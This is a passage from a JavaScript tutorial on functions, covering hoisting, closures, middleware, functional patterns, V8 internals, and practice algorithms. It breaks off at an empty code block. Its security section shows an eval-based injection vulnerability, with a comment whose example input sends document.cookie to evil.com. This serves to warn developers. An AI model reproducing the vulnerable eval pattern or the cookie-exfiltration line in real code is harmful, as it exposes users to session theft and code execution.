1. **Function Declarations**: Hoisted with **both identifier and function body initialized**. Can be called before declaration.
2. **`var` Variables**: Hoisted with identifier, initialized to `undefined`.
3. **`let` and `const` Variables**: Hoisted with identifier, but **UNINITIALIZED**. Accessing them before declaration triggers `ReferenceError` (Temporal Dead Zone).
4. **Function Expressions assigned to `const`**: Variable is in TDZ; calling before assignment throws `ReferenceError`.

```javascript
// Works!
declaredFn();
function declaredFn() { console.log("Declared"); }

// Throws ReferenceError: Cannot access 'expressionFn' before initialization
// expressionFn();
const expressionFn = function() { console.log("Expression"); };
```

---

## 52. Execution Order & The Event Loop Overview

While functions run synchronously on the single Call Stack, asynchronous tasks (I/O, timers, promise resolutions) are handled by the browser/Node runtime APIs and queued into task queues:

```text
┌─────────────────────────────────────────────────────────────┐
│                          CALL STACK                         │
│  [ Currently executing synchronous JavaScript function ]    │
└─────────────────────────────────────────────────────────────┘
                               ▲
                               │ Event Loop moves items when Stack is empty
      ┌────────────────────────┴────────────────────────┐
      │                                                 │
┌──────────────────────────────┐      ┌──────────────────────────────┐
│       Microtask Queue        │      │        Macrotask Queue       │
│  - Promise .then callbacks   │      │  - setTimeout / setInterval  │
│  - queueMicrotask            │      │  - I/O / Network callbacks   │
│  - process.nextTick (Node)   │      │  - setImmediate (Node)       │
│  (Emptied completely FIRST!) │      │                              │
└──────────────────────────────┘      └──────────────────────────────┘
```

---

## 53. Closure Lifetime & Memory Architecture

> 🧠 **CRITICAL CLARIFICATION**:
> Do NOT say a closure "copies all variables from the outer function into memory."
> The JavaScript runtime retains **references to the active Lexical Environment bindings**.
> In modern engines like V8, if an inner function captures even a single variable from an outer function, V8 allocates a **Context Object on the Heap** to hold the captured scope.

### Memory Retention & Leaks with Closures
If a closure references an object and the closure is kept alive (e.g. stored in a global variable or long-lived event listener), the referenced object **cannot be garbage collected**!

```javascript
function createLeakyHandler() {
  const hugePayload = new Array(1e7).fill("binary-data"); // ~80 MB of RAM!

  return function logInfo() {
    // Even if logInfo only uses hugePayload.length, the ENTIRE hugePayload
    // array is retained in memory by the closure!
    console.log("Payload size:", hugePayload.length);
  };
}

const leaky = createLeakyHandler(); // 80 MB stays in RAM indefinitely!
```

---

## 54. Pass-by-Value & Reference Behavior

> 💡 **THE JAVASCRIPT PASS-BY-VALUE INVARIANT**:
> JavaScript is **strictly 100% pass-by-value**.
> However, for objects and arrays, the "value" passed into the function is the **memory reference (pointer)** to the object on the heap!

### 1. Primitive: Reassignment does not affect caller
```javascript
function modifyPrimitive(val) {
  val = 999;
}
let num = 10;
modifyPrimitive(num);
console.log(num); // 10 (Caller's variable is completely unchanged!)
```

### 2. Object: Mutating a property affects caller
```javascript
function mutateObject(obj) {
  obj.status = "ONLINE"; // Mutates the underlying shared heap object!
}
const server = { status: "OFFLINE" };
mutateObject(server);
console.log(server.status); // "ONLINE" (Mutated!)
```

### 3. Object: Reassigning the parameter does NOT affect caller
```javascript
function replaceObject(obj) {
  obj = { status: "REPLACED" }; // Rebinds only the local parameter variable!
}
const cluster = { status: "ORIGINAL" };
replaceObject(cluster);
console.log(cluster.status); // "ORIGINAL" (Caller's pointer is untouched!)
```

---

## 55. Advanced Parameter Signatures

Modern JavaScript allows combining Destructuring, Default Values, and Rest Parameters into expressive, bulletproof function signatures:

```javascript
function configureService({
  host = "127.0.0.1",
  port = 8080,
  timeout = 5000,
  ...extraConfig
} = {}) {
  return { host, port, timeout, extraConfig };
}

console.log(configureService({ port: 3000, debug: true }));
// { host: '127.0.0.1', port: 3000, timeout: 5000, extraConfig: { debug: true } }

// Calling with no arguments at all:
console.log(configureService());
// { host: '127.0.0.1', port: 8080, timeout: 5000, extraConfig: {} }
```

---

## 56. Destructuring Parameters & The Empty Object Fallback

> ⚠️ **The Missing Fallback Crash**:
> If you destructure parameters without providing `= {}` as a default fallback, invoking the function without arguments will throw a fatal TypeError:
> `TypeError: Cannot destructure property 'name' of 'undefined' as it is undefined`.

```javascript
// ❌ CRASHES if called with no arguments:
function greetBroken({ name = "Guest" }) {
  return "Hello " + name;
}
// greetBroken(); // THROWS TYPEERROR!

// ✅ BULLETPROOF:
function greetSafe({ name = "Guest" } = {}) {
  return "Hello " + name;
}
console.log(greetSafe()); // "Hello Guest"
```

---

## 57. Function Overloading Patterns

JavaScript does **not** support traditional compile-time function overloading (declaring multiple functions with the same name and differing parameter types).
Instead, developers implement runtime overloading using **rest parameters, type checks, or options objects**:

```javascript
function createDate(...args) {
  if (args.length === 0) return new Date();
  if (args.length === 1) return new Date(args[0]); // timestamp or date string
  if (args.length >= 3) {
    const [year, month, day] = args;
    return new Date(year, month - 1, day);
  }
  throw new Error("Invalid arguments for createDate");
}

console.log(createDate(2026, 9, 12)); // Sat Sep 12 2026
```

---

## 58. Function Arity (`fn.length`)

**Arity** is the number of arguments expected by a function:
* `fn.length` counts formal parameters before the first default parameter.
* Excludes rest parameters.
* Historically used in Express middleware:
  * `app.use((req, res, next) => {})` (`length === 3` -> normal middleware)
  * `app.use((err, req, res, next) => {})` (`length === 4` -> error middleware)

---

## 59. Function Names & Stack Traces

Meaningful function names are crucial for observability in production:

```javascript
// Anonymous function in stack trace:
// at Array.map (<anonymous>)
// at file.js:10:15

// Named function in stack trace:
// at processUserOrder (file.js:10:15)
const processUserOrder = function processUserOrder(order) {
  // Clear name appears in Datadog/Sentry APM!
};
```

---

## 60. Function Error Handling

Functions communicate errors through three mechanisms:
1. **Synchronous Exception (`throw new Error()`)**: Handled via `try / catch`.
2. **Promise Rejection (`reject()` or throwing inside async)**: Handled via `.catch()` or `try / catch` around `await`.
3. **Error Return Value**: Returning an error result tuple `[err, data]` (Go style).

```javascript
// Go-style safe wrapper pattern:
async function safeExecute(asyncFn, ...args) {
  try {
    const data = await asyncFn(...args);
    return [null, data];
  } catch (err) {
    return [err, null];
  }
}
```

---

## 61. Retry, Timeout & Validation Wrappers

Production-grade function composition patterns:

```javascript
// 1. Timeout Wrapper using Promise.race:
function withTimeout(asyncFn, timeoutMs) {
  return function(...args) {
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error(`Operation timed out after ${timeoutMs}ms`)), timeoutMs)
    );
    return Promise.race([asyncFn.apply(this, args), timeoutPromise]);
  };
}

// 2. Retry Wrapper with Exponential Backoff:
function withRetry(asyncFn, { maxRetries = 3, delayMs = 100 } = {}) {
  return async function attempt(...args) {
    let lastError;
    for (let i = 0; i <= maxRetries; i++) {
      try {
        return await asyncFn.apply(this, args);
      } catch (err) {
        lastError = err;
        if (i < maxRetries) {
          const waitTime = delayMs * Math.pow(2, i);
          await new Promise(r => setTimeout(r, waitTime));
        }
      }
    }
    throw lastError;
  };
}
```

---

## 62. The Middleware Pipeline Architecture

The middleware pattern (pioneered by Connect, Express, and Koa) composes a sequence of functions that process a shared context sequentially:

```text
Request ──> Middleware 1 (Auth) ──> Middleware 2 (Rate Limit) ──> Handler (DB)
                                                                       │
Response <── [ Unwinds back through middlewares if async ] <───────────┘
```

```javascript
class MiddlewareRunner {
  constructor() {
    this.stack = [];
  }

  use(fn) {
    this.stack.push(fn);
  }

  async run(context) {
    let prevIndex = -1;

    const dispatch = async (index) => {
      if (index <= prevIndex) throw new Error("next() called multiple times");
      prevIndex = index;

      const fn = this.stack[index];
      if (!fn) return; // Reached end of pipeline

      await fn(context, () => dispatch(index + 1));
    };

    await dispatch(0);
  }
}

// Verification:
const runner = new MiddlewareRunner();
runner.use(async (ctx, next) => {
  ctx.logs = ["Auth OK"];
  await next();
  ctx.logs.push("Finished");
});
runner.use(async (ctx, next) => {
  ctx.logs.push("Validation OK");
  await next();
});

const ctx = {};
runner.run(ctx).then(() => console.log(ctx.logs));
// ['Auth OK', 'Validation OK', 'Finished']
```


---

## 63. Functional Programming in JavaScript

Functional Programming (FP) is a programming paradigm where programs are constructed by applying and composing pure functions rather than mutating sequential state.

### Core Principles of FP in JavaScript
1. **First-Class Functions**: Functions are values that can be passed, returned, and stored.
2. **Pure Functions**: Zero side effects, referential transparency.
3. **Immutability**: Data structures are not modified; new structures are returned.
4. **Declarative Style**: Expressing *what* you want to compute rather than *how* to step through memory.

```javascript
// Imperative Style (How to step through memory):
function getAdminEmailsImperative(users) {
  const emails = [];
  for (let i = 0; i < users.length; i++) {
    if (users[i].role === "admin" && users[i].isActive) {
      emails.push(users[i].email.toLowerCase());
    }
  }
  return emails;
}

// Functional / Declarative Style (What data transformation to perform):
const getAdminEmails = users => users
  .filter(u => u.role === "admin" && u.isActive)
  .map(u => u.email.toLowerCase());
```

---

## 64. Functional Array Patterns & Pipelines

Chaining pure array higher-order functions builds clear, readable data transformation pipelines:

```javascript
const transactions = [
  { id: "t1", category: "software", amount: 250, status: "completed" },
  { id: "t2", category: "hardware", amount: 1200, status: "pending" },
  { id: "t3", category: "software", amount: 400, status: "completed" }
];

// Pipeline: Filter -> Map -> Reduce
const completedSoftwareTotal = transactions
  .filter(t => t.status === "completed" && t.category === "software")
  .map(t => t.amount)
  .reduce((sum, amount) => sum + amount, 0);

console.log(completedSoftwareTotal); // 650
```

---

## 65. Functional vs Imperative: Avoiding Dogmatism

> 💡 **Senior Pragmatism Rule**:
> Never sacrifice readability, debugging clarity, or raw performance to satisfy theoretical functional purity!

| Scenario | Recommended Approach | Why? |
| :--- | :--- | :--- |
| **Simple list transformations** | Functional (`map`, `filter`) | Clear, self-documenting, immutable |
| **Complex multi-condition aggregations** | Imperative `for...of` loop | Avoids multiple passes and intermediate array allocations |
| **Hot loops (1,000,000+ operations/sec)** | Standard `for` loop | Inlined by V8 TurboFan with zero closure allocations |
| **Complex nested business state** | Pure Core / Impure Shell | Clean separation of concerns |

---

## 66. Recursion vs Iteration

| Dimension | Recursion | Iteration (`for` / `while`) |
| :--- | :--- | :--- |
| **Mental Model** | Self-similar sub-problems, divide-and-conquer | Step-by-step state accumulation |
| **Memory Overhead**| $O(d)$ Call Stack frames on heap/stack | $O(1)$ constant stack memory |
| **Risk** | Call Stack Overflow if depth $> 10,000$ | Infinite loop if condition never terminates |
| **Best Used For** | Trees, graphs, ASTs, recursive JSON structures | Flat arrays, sequential streams, bounded counting |

---

## 67. Senior Function Design Principles

1. **Single Responsibility Principle (SRP)**: A function should do one thing, do it well, and do it completely. If a function is called `validateAndSaveUserToDatabaseAndSendEmail`, it does 3 things and should be split into 3 functions.
2. **Small Size**: High-quality functions generally fit on a single screen (under 25 lines).
3. **Low Parameter Count ($le 3$)**: If a function requires more than 3 parameters, combine them into an **Options Object**:
   ```javascript
   // ❌ BAD: Positional arguments are error-prone and unreadable
   function createServer(host, port, timeout, maxConns, ssl, certPath) {}

   // ✅ GOOD: Self-documenting Options Object
   function createServer({ host, port, timeout, maxConns, ssl, certPath } = {}) {}
   ```
4. **Predictable Return Values**: Avoid returning mixed types (e.g. returning `false` on failure and an `object` on success). Return consistent shapes (`{ success: true, data }` or throw errors).

---

## 68. Dependency Injection (DI) in Functions

Instead of hardcoding external dependencies (database models, logger instances, HTTP clients) inside your function, pass them in as parameters. This makes unit testing effortless without complex mocking libraries:

```javascript
// Hardcoded Dependency (Hard to test in isolation):
// async function placeOrder(order) {
//   await db.orders.insert(order); // Requires real DB connection!
//   await stripe.charges.create(...);
// }

// Dependency-Injected Factory (Effortless testing!):
function makePlaceOrder({ orderRepo, paymentGateway, logger }) {
  return async function placeOrder(order) {
    logger.info(`Placing order for $${order.total}`);
    const charge = await paymentGateway.charge(order.total);
    await orderRepo.save({ ...order, chargeId: charge.id });
    return { success: true };
  };
}

// In Unit Test:
const mockRepo = { save: async () => {} };
const mockGateway = { charge: async () => ({ id: "ch_mock" }) };
const mockLogger = { info: () => {} };

const testOrder = makePlaceOrder({ orderRepo: mockRepo, paymentGateway: mockGateway, logger: mockLogger });
testOrder({ total: 50 }); // Works with zero real infrastructure!
```

---

## 69. The Closure-Based Module Pattern

Before ES Modules, JavaScript engineers used the Module Pattern (combining an IIFE with closures) to achieve true private variables and public APIs:

```javascript
const BankAccountModule = (function() {
  // Private variables and functions:
  let balance = 0;
  function logTransaction(type, amount) {
    console.log(`[Audit] ${type}: $${amount} (New Balance: $${balance})`);
  }

  // Public API returned to outside world:
  return {
    deposit(amount) {
      if (amount <= 0) throw new Error("Deposit must be positive");
      balance += amount;
      logTransaction("DEPOSIT", amount);
    },
    getBalance() {
      return balance;
    }
  };
})();

BankAccountModule.deposit(100); // "[Audit] DEPOSIT: $100 (New Balance: $100)"
console.log(BankAccountModule.getBalance()); // 100
console.log(BankAccountModule.balance); // undefined (Private!)
```

---

## 70. Callback Design Standards

When authoring asynchronous callback APIs, adhere to established Node.js standards:
1. **Error-First Callback Convention**: The first parameter must always be the error (or `null`), and the second parameter is the result: `callback(error, result)`.
2. **Execute Callbacks on Next Tick**: Never invoke a callback synchronously in some branches and asynchronously in others (the "Zalgo" bug). Always use `queueMicrotask` or `process.nextTick`.

---

## 71. Function Performance & Engine Optimization

1. **Avoid Function Allocations in Hot Loops**: Creating a function expression or closure inside a loop that runs 1,000,000 times forces the engine to allocate 1,000,000 function objects on the heap. Declare the function outside the loop.
2. **Monomorphic Call Sites**: A function that always receives objects of the exact same shape is **monomorphic**. V8 optimizes it with Inline Caching (IC) and generates blazing-fast machine code. If you pass objects with varying shapes (polymorphic or megamorphic), TurboFan de-optimizes back to generic bytecode.

---

## 72. V8 Engine Internals

> 🧠 **V8 IMPLEMENTATION DETAIL**:
> These are engine-specific optimization mechanics used by V8 (Node.js, Chrome). They are not guarantees of the ECMAScript specification.

1. **Ignition & TurboFan**: V8 first compiles JavaScript into bytecode using the **Ignition** interpreter. If a function is called frequently ("hot"), the **TurboFan** JIT (Just-In-Time) compiler optimizes it directly into native CPU machine code.
2. **De-optimization**: If assumptions made by TurboFan are violated (for instance, a function optimized for integers suddenly receives a string), TurboFan de-optimizes the function back to interpreted bytecode.
3. **Context Objects**: When a function forms a closure, V8 allocates an internal `Context` object on the heap to store the captured variables. This context persists until all functions closing over it are garbage collected.

---

## 73. Function Security & Code Injection Defenses

### 1. The Dangers of `eval()` and `new Function()`
`eval()` and `new Function()` compile and execute arbitrary strings as JavaScript code:
```javascript
// ❌ CRITICAL SECURITY VULNERABILITY (Remote Code Execution):
function executeUserCalculation(userFormula) {
  // If user enters: "process.exit(1)" or "fetch('evil.com', {body: document.cookie})"
  // the entire server or browser is compromised!
  return eval(userFormula);
}
```

### Defensive Rules
* **NEVER pass untrusted user input to `eval()` or `new Function()`**.
* Use a safe mathematical expression parser (e.g. mathjs or AST-based evaluators) instead of dynamic code execution.
* Prevent Prototype Pollution: Use `Object.freeze`, `Map`, or `Object.create(null)` for dictionary lookup maps.

---

## 74. 18 Common Function Bugs & Junior Pitfalls

1. **Forgetting the `return` Statement**: Function silently returns `undefined`.
2. **Calling Function Instead of Passing Reference**: Writing `btn.addEventListener("click", handleClick())` instead of `handleClick`.
3. **Losing `this` on Method Detachment**: Passing an object method as a callback without `.bind(this)` or arrow wrapper.
4. **Using Arrow Functions as Object Methods**: Arrow functions lack dynamic `this`, pointing to the outer window/module scope instead of the object.
5. **Using `arguments` in Arrow Functions**: Arrow functions do not have an `arguments` object; they inherit it from the outer non-arrow parent.
6. **Mutating Input Parameters**: Modifying properties of passed objects/arrays unexpectedly mutating caller state.
7. **Accidental Global Variables**: Omitting `const`/`let` in non-strict mode assigns to the global object.
8. **The `var` in Loop Closure Bug**: All callbacks share the same terminal index.
9. **Async `map` Returning Promises**: `arr.map(async ...)` returning array of pending promises instead of resolved values.
10. **Async `forEach` Fire-and-Forget**: Awaiting a `forEach` loop does not wait for its async callbacks.
11. **Infinite Recursion / Missing Base Case**: Stack overflow crash.
12. **Destructuring Without Default Object Fallback**: `function f({ a }) {}` crashing when called as `f()`.
13. **Assuming `null` Triggers Default Parameter**: Only `undefined` triggers default values; `null` remains `null`.
14. **Overly Complex Reduce When Loops are 10x Clearer**: Forcing clever functional code at the expense of readability.
15. **Rest Parameter Not at End**: Placing `...rest` before other parameters throws a `SyntaxError`.
16. **Arrow Function Object Literal Syntax Error**: `() => { a: 1 }` parsed as block body returning `undefined`.
17. **Retaining Huge Memory via Closures**: Holding large objects in scope when only a single property was needed.
18. **Uncaught Promise Rejections in Async Functions**: Forgetting to catch or await async errors.

---

## 75. DO / DON'T Engineering Matrix

| Area | DO | DON'T | WHY |
| :--- | :--- | :--- | :--- |
| **Naming** | Use descriptive action verbs: `calculateTax`, `fetchUserProfile` | Use ambiguous abbreviations: `doStuff`, `proc` | Self-documenting code and clear stack traces |
| **Parameters** | Use an Options Object for $> 3$ parameters | Use long lists of positional arguments | Eliminates ordering mistakes and makes defaults obvious |
| **Purity** | Keep business logic pure and deterministic | Scatter side effects (DB, DOM) inside utility functions | Allows easy testing and prevents race conditions |
| **Callbacks** | Use arrow functions for callbacks needing outer `this` | Use verbose `var self = this` or unnecessary binds | Lexical `this` is clean and native |
| **Methods** | Use standard method shorthand `method() {}` on objects | Use arrow functions as object methods | Preserves dynamic method receiver `this` |
| **Async Flow** | Use `Promise.all` for independent async operations | Await independent operations sequentially inside loops | Parallel processing minimizes total latency |
| **State** | Return new data structures immutably | Mutate incoming arguments directly | Prevents bugs in React, Redux, and concurrent workers |

---

## 76. Function Selection Decision Tree

```text
What kind of function do you need?
│
├── 1. Need a standard reusable function with full hoisting?
│   └── ──> Function Declaration: function name() {}
│
├── 2. Need to pass an inline callback with lexical 'this'?
│   └── ──> Arrow Function: const f = () => {}
│
├── 3. Need an object method with dynamic receiver 'this'?
│   └── ──> Method Shorthand: const obj = { run() {} }
│
├── 4. Need to isolate variables or execute top-level setup?
│   └── ──> IIFE: (() => {})()
│
├── 5. Need to perform I/O, fetch data, or query databases?
│   └── ──> Async Function: async function() {}
│
├── 6. Need to produce an on-demand lazy sequence of values?
│   └── ──> Generator Function: function* () {}
│
├── 7. Need to stream asynchronous paginated data?
│   └── ──> Async Generator: async function* () {}
│
├── 8. Need to encapsulate private state across calls?
│   └── ──> Function Factory / Closure: function make() { return () => {} }
│
└── 9. Need to construct object instances with prototypes?
    └── ──> ES6 Class (or Constructor Function)
```

---

## 77. Complete Function Comparison Table

| Function Type | Syntax | Hoisted? | Own `this`? | Own `arguments`? | Can Use `new`? | Has `.prototype`? | Returns Promise? | Typical Use Case |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Declaration** | `function f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No | Reusable module functions |
| **Expression** | `const f = function() {}`| ❌ TDZ | ✅ Dynamic | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No | Passing to variables |
| **Named Expression** | `const f = function g() {}`| ❌ TDZ | ✅ Dynamic | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No | Clean stack traces & recursion |
| **Arrow** | `const f = () => {}` | ❌ TDZ | ❌ Lexical | ❌ No | ❌ No | ❌ No | ❌ No | Callbacks & functional pipelines |
| **Method** | `{ f() {} }` | ❌ No | ✅ Dynamic | ✅ Yes | ❌ No | ❌ No | ❌ No | Object & class methods |
| **Constructor** | `function User() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No | Classical OOP instantiation |
| **Class Method** | `class C { f() {} }` | ❌ No | ✅ Dynamic | ✅ Yes | ❌ No | ❌ No | ❌ No | Domain model methods |
| **Async Function** | `async function f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ❌ No | ❌ No | ✅ Always | Asynchronous I/O & API calls |
| **Generator** | `function* f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ❌ No | ✅ Yes | ❌ No | Lazy iterables & state machines |
| **Async Generator**| `async function* f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ❌ No | ✅ Yes | ✅ Async Iterable | Streaming & paginated APIs |
| **IIFE** | `(function() {})()` | ❌ Immediate| ✅ Dynamic | ✅ Yes | ❌ N/A | ❌ N/A | ❌ No | Scope sandboxing |


---

## 78. Hands-On Practice System

Sharpen your function skills across 4 rigorous tiers:

### 🟢 Tier 1: Beginner Drills
1. **Greet**: Write a function declaration `greet(name)` returning a welcome string.
2. **Safe Sum**: Write a function that accepts two numbers with default values of `0` and returns their sum.
3. **Max Finder**: Write an arrow function `(a, b) => Math.max(a, b)`.

### 🟡 Tier 2: Intermediate Challenges
1. **Filter by Role**: Write a higher-order function that accepts an array of users and returns only active administrators.
2. **Dynamic Multiplier**: Write a function factory `createMultiplier(n)` returning a function that multiplies its argument by `n`.
3. **Bound Logger**: Create an object with a method, detach it to a standalone variable, and fix the resulting `this` error using `.bind()`.

### 🔴 Tier 3: Advanced Architectures
1. **Safe Async Pipeline**: Build an async function that fetches 3 independent endpoints in parallel using `Promise.allSettled` and aggregates errors.
2. **Auto-Curry**: Implement a recursive `curry()` helper that handles functions of arbitrary arity.
3. **LRU Memoize**: Build a memoization function that evicts the least recently used cache entry when capacity reaches 100.

### 🧠 Tier 4: Senior Systems
1. **Resilient HTTP Client**: Compose a function with a retry wrapper (3 attempts with exponential backoff), a timeout wrapper (5000ms), and structured logging.
2. **Middleware Pipeline**: Implement an asynchronous middleware runner capable of error handling and context propagation.

---

## 79. 40 Function Algorithms & Coding Problems

---

### Beginner Algorithms (1 – 10)

#### 1. Add Two Numbers
```javascript
const add = (a = 0, b = 0) => a + b;
// add(5, 7) -> 12 | Time: O(1) | Space: O(1)
```

#### 2. Find Maximum of Two Numbers
```javascript
const maxOfTwo = (a, b) => (a > b ? a : b);
// maxOfTwo(14, 9) -> 14 | Time: O(1) | Space: O(1)
```

#### 3. Check Even or Odd
```javascript
const isEven = n => n % 2 === 0;
// isEven(8) -> true | Time: O(1) | Space: O(1)
```

#### 4. Check Prime Number
```javascript
function isPrime(n) {
  if (n <= 1) return false;
  if (n <= 3) return true;
  if (n % 2 === 0 || n % 3 === 0) return false;
  for (let i = 5; i * i <= n; i += 6) {
    if (n % i === 0 || n % (i + 2) === 0) return false;
  }
  return true;
}
// isPrime(29) -> true | Time: O(sqrt(n)) | Space: O(1)
```

#### 5. Calculate Factorial
```javascript
function factorial(n) {
  let res = 1;
  for (let i = 2; i <= n; i++) res *= i;
  return res;
}
// factorial(5) -> 120 | Time: O(n) | Space: O(1)
```

#### 6. Reverse String
```javascript
const reverseString = str => str.split("").reverse().join("");
// reverseString("code") -> "edoc" | Time: O(n) | Space: O(n)
```

#### 7. Palindrome Check
```javascript
function isPalindrome(str) {
  const clean = str.toLowerCase().replace(/[^a-z0-9]/g, "");
  let l = 0, r = clean.length - 1;
  while (l < r) {
    if (clean[l++] !== clean[r--]) return false;
  }
  return true;
}
// isPalindrome("A man, a plan, a canal: Panama") -> true
```

#### 8. Count Vowels in String
```javascript
function countVowels(str) {
  const vowels = new Set(["a", "e", "i", "o", "u"]);
  let count = 0;
  for (const char of str.toLowerCase()) {
    if (vowels.has(char)) count++;
  }
  return count;
}
// countVowels("Antigravity") -> 4 | Time: O(n) | Space: O(1)
```

#### 9. Character Frequency Map
```javascript
function charFrequency(str) {
  const freq = {};
  for (const char of str) freq[char] = (freq[char] || 0) + 1;
  return freq;
}
// charFrequency("google") -> { g: 2, o: 2, l: 1, e: 1 }
```

#### 10. Sum Array Elements
```javascript
const sumArray = arr => arr.reduce((acc, curr) => acc + curr, 0);
// sumArray([1, 2, 3, 4]) -> 10 | Time: O(n) | Space: O(1)
```

---

### Intermediate Algorithms (11 – 26)

#### 11. Higher-Order Arithmetic Calculator
```javascript
function createCalculator(operations = {}) {
  return (opName, a, b) => {
    if (!operations[opName]) throw new Error(`Operation ${opName} unsupported`);
    return operations[opName](a, b);
  };
}
const calc = createCalculator({ add: (a, b) => a + b, mul: (a, b) => a * b });
console.log(calc("mul", 6, 7)); // 42
```

#### 12. Multiplier Function Factory
```javascript
const multiplier = factor => number => number * factor;
const double = multiplier(2);
console.log(double(15)); // 30
```

#### 13. Custom Map Implementation
```javascript
function customMap(array, callback) {
  const result = new Array(array.length);
  for (let i = 0; i < array.length; i++) {
    if (i in array) result[i] = callback(array[i], i, array);
  }
  return result;
}
```

#### 14. Custom Filter Implementation
```javascript
function customFilter(array, predicate) {
  const result = [];
  for (let i = 0; i < array.length; i++) {
    if (i in array && predicate(array[i], i, array)) {
      result.push(array[i]);
    }
  }
  return result;
}
```

#### 15. Custom Reduce Implementation
```javascript
function customReduce(array, callback, initialValue) {
  let startIndex = 0;
  let acc;
  if (arguments.length >= 3) {
    acc = initialValue;
  } else {
    if (array.length === 0) throw new TypeError("Reduce of empty array with no initial value");
    while (!(startIndex in array) && startIndex < array.length) startIndex++;
    acc = array[startIndex++];
  }
  for (let i = startIndex; i < array.length; i++) {
    if (i in array) acc = callback(acc, array[i], i, array);
  }
  return acc;
}
```

#### 16. Custom ForEach Implementation
```javascript
function customForEach(array, callback) {
  for (let i = 0; i < array.length; i++) {
    if (i in array) callback(array[i], i, array);
  }
}
```

#### 17. Function Composition (`compose`)
```javascript
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);
```

#### 18. Function Pipeline (`pipe`)
```javascript
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);
```

#### 19. `once(fn)` Execution Wrapper
```javascript
function once(fn) {
  let executed = false;
  let result;
  return function(...args) {
    if (!executed) {
      executed = true;
      result = fn.apply(this, args);
    }
    return result;
  };
}
```

#### 20. Simple Pure Memoize
```javascript
function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const val = fn.apply(this, args);
    cache.set(key, val);
    return val;
  };
}
```

#### 21. Debounce Function
```javascript
function debounce(fn, delayMs) {
  let timerId;
  return function(...args) {
    clearTimeout(timerId);
    timerId = setTimeout(() => fn.apply(this, args), delayMs);
  };
}
```

#### 22. Throttle Function
```javascript
function throttle(fn, limitMs) {
  let lastRan = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastRan >= limitMs) {
      lastRan = now;
      fn.apply(this, args);
    }
  };
}
```

#### 23. Flexible Auto-Curry
```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) return fn.apply(this, args);
    return (...next) => curried.apply(this, [...args, ...next]);
  };
}
```

#### 24. Custom Partial Application
```javascript
const partial = (fn, ...preset) => (...later) => fn(...preset, ...later);
```

#### 25. Synchronous Retry
```javascript
function retrySync(fn, attempts = 3) {
  let lastErr;
  for (let i = 0; i < attempts; i++) {
    try {
      return fn();
    } catch (err) {
      lastErr = err;
    }
  }
  throw lastErr;
}
```

#### 26. Asynchronous Timeout Wrapper
```javascript
function withTimeout(promise, ms) {
  const timeout = new Promise((_, reject) =>
    setTimeout(() => reject(new Error(`Timed out after ${ms}ms`)), ms)
  );
  return Promise.race([promise, timeout]);
}
```

---

### Advanced Algorithms (27 – 40)

#### 27. Deep Clone Function (Handling Circular References)
```javascript
function deepClone(val, seen = new WeakMap()) {
  if (val === null || typeof val !== "object") return val;
  if (val instanceof Date) return new Date(val.getTime());
  if (val instanceof RegExp) return new RegExp(val.source, val.flags);
  if (seen.has(val)) return seen.get(val);

  const copy = Array.isArray(val) ? [] : {};
  seen.set(val, copy);

  for (const key of Reflect.ownKeys(val)) {
    copy[key] = deepClone(val[key], seen);
  }
  return copy;
}
```

#### 28. Deep Structural Equality Check
```javascript
function deepEqual(a, b) {
  if (Object.is(a, b)) return true;
  if (typeof a !== "object" || a === null || typeof b !== "object" || b === null) return false;

  const keysA = Reflect.ownKeys(a);
  const keysB = Reflect.ownKeys(b);
  if (keysA.length !== keysB.length) return false;

  for (const k of keysA) {
    if (!Reflect.has(b, k) || !deepEqual(a[k], b[k])) return false;
  }
  return true;
}
```

#### 29. Custom Promise-like Micro-Implementation
```javascript
class SimpleDeferred {
  constructor() {
    this.status = "pending";
    this.value = undefined;
    this.handlers = [];
  }
  resolve(val) {
    if (this.status !== "pending") return;
    this.status = "fulfilled";
    this.value = val;
    this.handlers.forEach(h => h(val));
  }
  then(callback) {
    if (this.status === "fulfilled") {
      callback(this.value);
    } else {
      this.handlers.push(callback);
    }
    return this;
  }
}
```

#### 30. Async Task Queue (Sequential Worker)
```javascript
class AsyncQueue {
  constructor() {
    this.queue = [];
    this.working = false;
  }
  enqueue(taskFn) {
    return new Promise((resolve, reject) => {
      this.queue.push({ taskFn, resolve, reject });
      this._dequeue();
    });
  }
  async _dequeue() {
    if (this.working || this.queue.length === 0) return;
    this.working = true;
    const { taskFn, resolve, reject } = this.queue.shift();
    try {
      resolve(await taskFn());
    } catch (err) {
      reject(err);
    } finally {
      this.working = false;
      this._dequeue();
    }
  }
}
```

#### 31. Concurrency Limiter Pool (`pLimit`)
```javascript
function pLimit(concurrency) {
  const queue = [];
  let activeCount = 0;

  const next = () => {
    activeCount--;
    if (queue.length > 0) queue.shift()();
  };

  return function run(fn, ...args) {
    return new Promise((resolve, reject) => {
      const execute = () => {
        activeCount++;
        fn(...args).then(resolve).catch(reject).finally(next);
      };
      if (activeCount < concurrency) execute();
      else queue.push(execute);
    });
  };
}
```

#### 32. Task Scheduler with Delays
```javascript
class TaskScheduler {
  constructor() { this.tasks = []; }
  schedule(taskFn, delayMs) {
    const id = setTimeout(taskFn, delayMs);
    this.tasks.push(id);
    return id;
  }
  cancelAll() {
    this.tasks.forEach(clearTimeout);
    this.tasks = [];
  }
}
```

#### 33. Async Middleware Runner Pipeline
```javascript
function composeMiddleware(middlewares) {
  return function(context) {
    let index = -1;
    function dispatch(i) {
      if (i <= index) return Promise.reject(new Error("next() called multiple times"));
      index = i;
      const fn = middlewares[i];
      if (!fn) return Promise.resolve();
      try {
        return Promise.resolve(fn(context, () => dispatch(i + 1)));
      } catch (err) {
        return Promise.reject(err);
      }
    }
    return dispatch(0);
  };
}
```

#### 34. Educational Event Emitter
```javascript
